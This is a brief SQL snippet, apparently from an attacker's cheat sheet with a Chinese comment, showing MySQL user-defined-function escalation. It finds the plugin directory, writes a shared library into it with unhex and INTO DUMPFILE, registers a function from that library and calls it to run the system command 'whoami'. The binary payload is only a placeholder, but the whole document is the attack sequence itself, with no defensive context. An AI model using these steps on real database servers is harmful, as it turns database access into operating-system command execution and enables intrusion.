show variables like '%plugin%';
\# 默认为/usr/lib/mysql/plugin/

select unhex('payloads') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';

create function cyy_udf_eval returns string soname 'mysqludf.so';

select cyy_udf_eval('whoami');